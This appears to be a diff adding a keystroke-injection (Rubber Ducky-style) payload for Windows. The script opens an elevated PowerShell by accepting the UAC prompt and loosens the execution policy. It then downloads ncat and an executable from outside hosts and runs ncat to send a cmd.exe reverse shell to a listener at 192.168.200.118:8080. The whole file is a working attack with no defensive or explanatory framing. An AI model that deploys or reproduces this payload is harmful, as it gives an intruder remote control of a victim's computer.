@@ -1,0 +1,64 @@
+GUI R
+DELAY 1
+STRING cmd.exe
+ENTER
+DELAY 1
+STRING mkdir C:\test
+DELAY 1
+ENTER
+DELAY 1
+STRING exit
+ENTER
+GUI R
+DELAY 2
+STRING PowerShell
+DELAY 1
+ENTER
+DELAY 2
+STRING Start-Process PowerShell -Verb RunAs
+DELAY 1
+ENTER
+DELAY 2
+LEFT
+DELAY 1
+ENTER
+ENTER
+DELAY 3
+STRING Set-ExecutionPolicy RemoteSigned
+DELAY 2
+ENTER
+STRING Y
+DELAY 2
+ENTER
+DELAY 1
+STRING Invoke-WebRequest -Uri https://nmap.org/dist/nmap-7.80-win32.zip -Outfile C:\test\nc.zip
+DELAY 1
+ENTER
+DELAY 30
+STRING Invoke-WebRequest -Uri http://pwnpalace.com/download/others/fce642c6-1963-4a0d-bffe-173f43f02329.zip -Outfile C:\test\unzip.exe
+DELAY 2
+ENTER
+DELAY 10
+STRING exit
+ENTER
+DELAY 1
+STRING exit
+ENTER
+DELAY 1
+GUI R
+DELAY 1
+STRING cmd.exe
+ENTER
+DELAY 1
+STRING cd C:\test
+ENTER
+DELAY 1
+STRING unzip.exe nc.zip
+ENTER
+DELAY 3
+STRING cd nmap-7.80
+ENTER
+DELAY 1
+STRING ncat.exe 192.168.200.118 8080 -e cmd.exe
+DELAY 1 
+ENTER
